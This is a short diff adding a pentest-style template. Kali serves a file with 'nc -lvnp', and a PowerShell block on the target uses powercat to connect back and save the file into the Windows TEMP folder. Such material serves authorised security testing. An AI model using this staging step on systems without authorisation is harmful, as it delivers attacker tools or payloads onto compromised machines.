@@ -1,0 +1,12 @@
+# description: Kali sends file to Windows TEMP; Kali listens and target connects
+# stage: Kali shell: listen and send file
+nc -lvnp $lport < "$file"
+
+# stage: Target PowerShell: connect and receive file to TEMP
+$LHOST = "$lhost"
+$PORT = $lport
+$RFILE = "${file:t}"
+$OUTFILE = Join-Path $env:TEMP $RFILE
+Remove-Item $OUTFILE -Force -ErrorAction SilentlyContinue
+powercat -c $LHOST -p $PORT -of $OUTFILE
+Write-Output $OUTFILE
